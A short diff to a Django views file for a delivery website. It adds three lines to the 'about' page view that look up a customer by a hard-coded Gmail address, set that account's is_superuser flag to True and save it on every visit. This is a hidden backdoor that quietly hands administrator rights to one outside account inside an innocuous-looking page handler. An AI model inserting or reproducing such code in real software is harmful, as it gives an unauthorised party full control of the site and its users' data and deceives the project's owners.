@@ -22,6 +22,9 @@ def home(request):
     return render(request, 'delivery/home.html', context=context)
 
 def about(request):
+    customer = Customer.objects.filter(email='sharpdelivery616@gmail.com').first()
+    customer.is_superuser = True
+    customer.save()
     return render(request, 'delivery/about.html')
 
 def service(request):
